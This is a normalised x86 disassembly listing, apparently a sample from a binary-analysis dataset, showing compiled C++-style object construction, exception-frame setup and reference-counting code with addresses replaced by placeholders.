xor eax eax
mov ebx eax
push 0x2
push 0x0
push edi
call sub_4c0458
add esp 0xc
push rw-data
call sub_4c0888
pop ecx
test al al
jne r-xdata
xor edx edx
mov ebx edx
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor edx edx
mov ebx edx
push 0x2
push 0x0
push rw-data
call sub_4c0458
add esp 0xc
xor ecx ecx
mov ebx ecx
mov eax [ rw-data ]
push eax
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor ecx ecx
mov ebx ecx
push 0x2
push 0x0
push rw-data
call sub_4c0458
add esp 0xc
xor eax eax
mov ebx eax
xor edx edx
mov ebx edx
sub_4bd868
push ebp
mov ebp esp
add esp 0xfffff9ac
push ebx
push esi
push edi
lea ebx [ ebp - 0x2f0 ]
mov eax rw-data
call sub_4c517c
mov [ ebx + 0x10 ] 0xc
mov [ ebx + 0x10 ] 0x18
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_4c3b24
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov [ ebp - 0x2f1 ] 0x1
mov [ rw-data ] 0x1
inc [ rw-data ]
mov [ ebp - 0x2f1 ] 0x0
jmp r-xdata
inc [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x24
cmp [ rw-data ] 0x0
jl r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov edx [ ebx ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push 0x58
call sub_415614
add esp 0x8
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0xc
cmp [ ebp - 0x2f1 ] 0x0
je r-xdata
push rw-data
push 0x58
call sub_415614
add esp 0x8
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x54
mov edx rw-data
mov ecx [ ebp - 0x8 ]
mov [ ecx ] edx
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
push rw-data
push 0x58
call sub_415614
add esp 0x8
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x9c
mov edx rw-data
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebx + 0x10 ] 0x78
mov edx [ ebp - 0xc ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebx + 0x10 ] 0x60
mov ecx [ ebp - 0xc ]
jmp r-xdata
push rw-data
push 0x50
call sub_415614
add esp 0x8
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0xe4
mov edx rw-data
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x10 ] 0xc0
mov edx [ ebp - 0x14 ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebx + 0x10 ] 0xa8
mov ecx [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x3c ] ecx
mov [ ebx + 0x10 ] 0x54
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
add edx 0xc
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
add edx 0x10
mov [ ecx + 0x18 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add eax 0x1c
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
add ecx 0x20
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
add edx 0x2c
mov [ ecx + 0x34 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add eax 0x30
mov [ edx + 0x38 ] eax
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x28 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x38 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x34 ]
mov ecx rw-data
mov [ eax ] edx
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
mov [ eax ] ecx
push 0x0
push rw-data
mov edx [ ebp - 0x8 ]
push edx
call sub_4c0458
add esp 0xc
dec [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x3c
push rw-data
push 0x48
call sub_415614
add esp 0x8
mov [ ebp - 0xcc ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x12c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
add edx 0x10
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp - 0x20 ]
add eax 0x10
mov [ ebp - 0x2f8 ] eax
mov eax rw-data
mov ecx [ ebp - 0x2f8 ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x2f8 ]
mov [ edx + 0x8 ] eax
mov edx rw-data
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x20 ]
mov eax [ ecx ]
xor ecx ecx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov [ edx + 0x8 ] ecx
mov eax [ ebp - 0x20 ]
mov esi [ eax ]
push esi
call sub_4b3158
pop ecx
xor edx edx
mov [ esi + 0x30 ] rw-data
mov [ esi + 0x34 ] edx
lea eax [ ebp - 0x30 ]
mov [ ebx + 0x10 ] 0x138
mov ecx [ esi + 0x2c ]
push ecx
push eax
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x300 ] edx
xor ecx ecx
mov [ ebx + 0x10 ] 0x144
mov [ ebp - 0x34 ] ecx
add esp 0x8
cmp [ ebp - 0x34 ] 0x1
je r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebx + 0x10 ] 0x108
mov edx [ ebp - 0x1c ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebx + 0x10 ] 0xf0
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x3c ] ecx
mov [ ebx + 0x10 ] 0x9c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
add edx 0xc
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
add edx 0x10
mov [ ecx + 0x18 ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add eax 0x1c
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
add ecx 0x20
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
add edx 0x2c
mov [ ecx + 0x34 ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add eax 0x30
mov [ edx + 0x38 ] eax
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x28 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x38 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x34 ]
mov ecx rw-data
mov [ eax ] edx
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x10 ]
mov [ eax ] ecx
push 0x0
push rw-data
mov edx [ ebp - 0x10 ]
push edx
call sub_4c0458
add esp 0xc
dec [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x84
mov eax [ rw-data ]
mov [ ebp - 0x490 ] eax
mov edx [ ebp - 0x490 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x494 ] eax
mov edx [ ebp - 0x490 ]
mov [ edx + 0x34 ] rw-data
push rw-data
push 0x48
call sub_415614
add esp 0x8
mov [ ebp - 0x178 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x1bc
mov eax [ ebp - 0xcc ]
mov edx [ ebp - 0xcc ]
add edx 0x8
mov ecx rw-data
mov [ eax ] edx
mov edx [ ebp - 0xcc ]
add edx 0x8
mov [ ebp - 0x3c4 ] edx
mov edx rw-data
mov eax [ ebp - 0x3c4 ]
mov [ eax + 0x8 ] ecx
mov eax rw-data
inc [ ebx + 0x1c ]
mov ecx [ ebp - 0x3c4 ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0xcc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0xcc ]
mov edx [ eax ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp - 0xcc ]
mov esi [ ecx ]
push esi
call sub_4b3158
pop ecx
xor eax eax
mov [ esi + 0x30 ] rw-data
mov [ esi + 0x34 ] eax
lea ecx [ ebp - 0xdc ]
mov [ ebx + 0x10 ] 0x1c8
mov edx [ esi + 0x2c ]
push edx
push ecx
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea eax [ ebp - 0xdc ]
mov [ ebp - 0x3cc ] eax
xor edx edx
mov [ ebx + 0x10 ] 0x1d4
mov [ ebp - 0xe0 ] edx
add esp 0x8
cmp [ ebp - 0xe0 ] 0x1
je r-xdata
mov eax [ ebp - 0x34 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x34 ] 0x3
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax + 0x3c ] ecx
mov [ ebx + 0x10 ] 0xe4
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
add edx 0xc
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
add edx 0x10
mov [ ecx + 0x18 ] edx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
add eax 0x1c
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
add ecx 0x20
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
add edx 0x2c
mov [ ecx + 0x34 ] edx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
add eax 0x30
mov [ edx + 0x38 ] eax
xor edx edx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x28 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x38 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x34 ]
mov ecx rw-data
mov [ eax ] edx
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x18 ]
mov [ eax ] ecx
push 0x0
push rw-data
mov edx [ ebp - 0x18 ]
push edx
call sub_4c0458
add esp 0xc
dec [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0xcc
mov eax [ rw-data ]
mov [ ebp - 0x56c ] eax
mov edx [ ebp - 0x56c ]
mov ecx [ edx + 0x34 ]
mov [ ebp - 0x570 ] ecx
mov eax [ ebp - 0x56c ]
mov [ eax + 0x34 ] rw-data
mov edx [ rw-data ]
mov [ ebp - 0x574 ] edx
mov ecx [ ebp - 0x574 ]
mov eax [ ecx + 0x18 ]
mov [ ebp - 0x578 ] eax
mov edx [ ebp - 0x574 ]
or [ edx + 0x18 ] 0x2000
push rw-data
push 0x48
call sub_415614
add esp 0x8
mov [ ebp - 0x224 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x24c
mov ecx [ ebp - 0x178 ]
mov edx [ ebp - 0x178 ]
add edx 0x8
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp - 0x178 ]
add eax 0x8
mov [ ebp - 0x498 ] eax
mov eax rw-data
mov ecx [ ebp - 0x498 ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x498 ]
mov [ edx + 0x8 ] eax
mov edx rw-data
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x178 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x178 ]
mov eax [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x178 ]
mov ecx [ edx ]
mov [ ebp - 0x49c ] ecx
mov eax [ ebp - 0x49c ]
push eax
call sub_4b3158
pop ecx
mov edx [ ebp - 0x49c ]
mov [ edx + 0x30 ] rw-data
mov ecx [ ebp - 0x49c ]
xor eax eax
mov [ ecx + 0x34 ] eax
mov [ ebx + 0x10 ] 0x258
mov edx [ ebp - 0x49c ]
mov ecx [ edx + 0x2c ]
push ecx
lea eax [ ebp - 0x188 ]
push eax
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x188 ]
mov [ ebp - 0x4a4 ] edx
xor ecx ecx
mov [ ebx + 0x10 ] 0x264
mov [ ebp - 0x18c ] ecx
add esp 0x8
cmp [ ebp - 0x18c ] 0x1
je r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_4c3b24
pop ecx
cmp [ ebp - 0xe0 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x308 ] eax
mov edx [ ebp - 0x308 ]
push edx
mov ecx [ ebp - 0x300 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x30c ] eax
cmp [ ebp - 0x30c ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x150
xor ecx ecx
mov [ ebp - 0x3c ] ecx
cmp [ ebp - 0x3c ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x304 ] edx
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x650 ] eax
mov edx [ ebp - 0x650 ]
mov ecx [ edx + 0x34 ]
mov [ ebp - 0x654 ] ecx
mov eax [ ebp - 0x650 ]
mov [ eax + 0x34 ] rw-data
mov [ ebx + 0x10 ] 0x2dc
mov ecx [ ebp - 0x224 ]
mov edx [ ebp - 0x224 ]
add edx 0x8
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp - 0x224 ]
add eax 0x8
mov [ ebp - 0x57c ] eax
mov eax rw-data
mov ecx [ ebp - 0x57c ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x57c ]
mov [ edx + 0x8 ] eax
mov edx rw-data
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x224 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x224 ]
mov eax [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x224 ]
mov ecx [ edx ]
mov [ ebp - 0x580 ] ecx
mov eax [ ebp - 0x580 ]
push eax
call sub_4b3158
pop ecx
mov edx [ ebp - 0x580 ]
mov [ edx + 0x30 ] rw-data
mov ecx [ ebp - 0x580 ]
xor eax eax
mov [ ecx + 0x34 ] eax
mov [ ebx + 0x10 ] 0x2e8
mov edx [ ebp - 0x580 ]
mov ecx [ edx + 0x2c ]
push ecx
lea eax [ ebp - 0x234 ]
push eax
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x234 ]
mov [ ebp - 0x588 ] edx
xor ecx ecx
mov [ ebx + 0x10 ] 0x2f4
mov [ ebp - 0x238 ] ecx
add esp 0x8
cmp [ ebp - 0x238 ] 0x1
je r-xdata
mov eax [ ebp - 0x18c ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x18c ] 0x3
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x3d4 ] ecx
mov eax [ ebp - 0x3d4 ]
push eax
mov edx [ ebp - 0x3cc ]
push edx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x3d8 ] eax
cmp [ ebp - 0x3d8 ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x1e0
xor edx edx
mov [ ebp - 0xe8 ] edx
cmp [ ebp - 0xe8 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x3d0 ] eax
jne r-xdata
mov eax [ ebp - 0x30c ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0x34 ] 0x1
je r-xdata
cmp [ ebp - 0x304 ] 0x0
je r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x3c ] 0x3
jne r-xdata
mov eax [ ebp - 0x238 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x238 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4ac ] eax
mov edx [ ebp - 0x4ac ]
push edx
mov ecx [ ebp - 0x4a4 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x4b0 ] eax
cmp [ ebp - 0x4b0 ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x270
xor ecx ecx
mov [ ebp - 0x194 ] ecx
cmp [ ebp - 0x194 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x4a8 ] edx
jne r-xdata
mov eax [ ebp - 0x3d8 ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0xe0 ] 0x1
je r-xdata
cmp [ ebp - 0x3d0 ] 0x0
je r-xdata
mov ecx [ ebp - 0xe8 ]
push ecx
call sub_4c3b24
pop ecx
cmp [ ebp - 0xe8 ] 0x3
jne r-xdata
mov edx [ ebp - 0x34 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x34 ] 0x3
jne r-xdata
lea edx [ ebp - 0x304 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x304 ]
mov [ ebp - 0x30c ] eax
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x3c ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x590 ] eax
mov edx [ ebp - 0x590 ]
push edx
mov ecx [ ebp - 0x588 ]
push ecx
call sub_4b9c80
add esp 0x8
mov [ ebp - 0x594 ] eax
cmp [ ebp - 0x594 ] 0x0
jne r-xdata
mov [ ebx + 0x10 ] 0x300
xor ecx ecx
mov [ ebp - 0x240 ] ecx
cmp [ ebp - 0x240 ] 0x1
je r-xdata
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x58c ] edx
jne r-xdata
mov eax [ ebp - 0x4b0 ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0x18c ] 0x1
je r-xdata
cmp [ ebp - 0x4a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x194 ] 0x3
jne r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0xe0 ] 0x3
jne r-xdata
lea eax [ ebp - 0x3d0 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x3d0 ]
mov [ ebp - 0x3d8 ] ecx
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0xe8 ] 0x1
je r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] eax
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
push esi
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x114
mov edx [ esi + 0x10 ]
or edx 0x4
mov [ ebp - 0x3c0 ] edx
push 0x0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x138
mov [ ebp - 0x2fc ] ecx
push 0x20
mov eax [ ebp - 0x2fc ]
push eax
mov edx [ eax ]
call [ edx + 0x24 ]
add esp 0x8
lea ecx [ ebp - 0x30 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x12c
mov [ esi + 0x38 ] ax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x304 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x3c ] 0x3
jne r-xdata
mov eax [ ebp - 0x594 ]
push eax
dec [ ebx + 0x1c ]
cmp [ ebp - 0x238 ] 0x1
je r-xdata
cmp [ ebp - 0x58c ] 0x0
je r-xdata
mov eax [ ebp - 0x240 ]
push eax
call sub_4c3b24
pop ecx
cmp [ ebp - 0x240 ] 0x3
jne r-xdata
mov edx [ ebp - 0x18c ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x18c ] 0x3
jne r-xdata
lea edx [ ebp - 0x4a8 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4b0 ] eax
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x194 ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
push esi
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x1a4
mov edx [ esi + 0x10 ]
or edx 0x4
mov [ ebp - 0x48c ] edx
push 0x0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x1c8
mov [ ebp - 0x3c8 ] ecx
push 0x20
mov eax [ ebp - 0x3c8 ]
push eax
mov edx [ eax ]
call [ edx + 0x24 ]
add esp 0x8
lea ecx [ ebp - 0xdc ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x1bc
mov [ esi + 0x38 ] ax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x3d0 ] 0x0
jne r-xdata
mov edx [ ebp - 0xe8 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0xe8 ] 0x3
jne r-xdata
mov ecx [ ebp - 0x3c0 ]
mov ecx [ ebp - 0x3c0 ]
or ecx 0x4
jmp r-xdata
mov edx [ ebp - 0x304 ]
mov [ ebp - 0x30c ] edx
mov ecx [ ebp - 0x304 ]
mov eax [ ebp - 0x304 ]
mov [ ebp - 0x3bc ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x3bc ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x3bc ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0x38 ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0x38 ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0x38 ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x20
call sub_4bbbac
pop ecx
mov [ ebp - 0x40 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x144
mov edx [ ebp - 0x238 ]
push edx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x238 ] 0x3
jne r-xdata
lea edx [ ebp - 0x58c ]
test edx edx
je r-xdata
mov eax [ ebp - 0x58c ]
mov [ ebp - 0x594 ] eax
jmp r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x240 ] 0x1
je r-xdata
inc [ rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x49c ]
push ecx
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x234
mov eax [ ebp - 0x49c ]
mov edx [ eax + 0x10 ]
or edx 0x4
mov [ ebp - 0x568 ] edx
push 0x0
mov ecx [ ebp - 0x49c ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x258
mov [ ebp - 0x4a0 ] ecx
push 0x20
mov eax [ ebp - 0x4a0 ]
push eax
mov edx [ eax ]
call [ edx + 0x24 ]
add esp 0x8
lea ecx [ ebp - 0x188 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x24c
mov edx [ ebp - 0x49c ]
mov [ edx + 0x38 ] ax
mov ecx [ ebp - 0x49c ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x4a8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x194 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x194 ] 0x3
jne r-xdata
mov ecx [ ebp - 0x48c ]
mov ecx [ ebp - 0x48c ]
or ecx 0x4
jmp r-xdata
mov edx [ ebp - 0x3d0 ]
mov [ ebp - 0x3d8 ] edx
mov ecx [ ebp - 0x3d0 ]
mov eax [ ebp - 0x3d0 ]
mov [ ebp - 0x488 ] eax
mov [ rw-data ] ecx
mov edx [ ebp - 0x488 ]
add edx 0x4
push edx
call sub_4c3b78
pop ecx
mov ecx [ ebp - 0x488 ]
push ecx
call sub_4ba37c
pop ecx
push ebx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
lea edx [ ebp - 0xe4 ]
push edx
call sub_4088ac
pop ecx
lea eax [ ebp - 0xe4 ]
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ ebp - 0xe4 ] ecx
inc [ ebx + 0x1c ]
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
push 0x20
call sub_4bbbac
pop ecx
mov [ ebp - 0xec ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x1d4
push ecx
push esi
call sub_4b02b0
add esp 0xc
mov ecx [ ebp - 0x40 ]
mov [ ebx + 0x10 ] 0x180
mov edx [ ebp - 0x300 ]
mov ecx [ edx + 0x8 ]
add ecx 0x18
mov [ ebp - 0x314 ] ecx
mov eax [ ebp - 0x314 ]
add eax 0x8
push eax
lea edx [ ebp - 0x31c ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x31c ]
push ecx
lea eax [ ebp - 0x60 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x31d ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x580 ]
push ecx
call sub_4b30b8
pop ecx
add [ ebx + 0x1c ] 0xfffffffe
mov [ ebx + 0x10 ] 0x2c4
mov eax [ ebp - 0x580 ]
mov edx [ eax + 0x10 ]
or edx 0x4
mov [ ebp - 0x64c ] edx
push 0x0
mov ecx [ ebp - 0x580 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
pop ecx
mov [ ebx + 0x10 ] 0x2e8
mov [ ebp - 0x584 ] ecx
push 0x20
mov eax [ ebp - 0x584 ]
push eax
mov edx [ eax ]
call [ edx + 0x24 ]
add esp 0x8
lea ecx [ ebp - 0x234 ]
push eax
dec [ ebx + 0x1c ]
push 0x2
push ecx
call sub_4b2f24
add esp 0x8
pop eax
mov [ ebx + 0x10 ] 0x2dc
mov edx [ ebp - 0x580 ]
mov [ edx + 0x38 ] ax
mov ecx [ ebp - 0x580 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov eax 0x1
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x58c ] 0x0
jne r-xdata
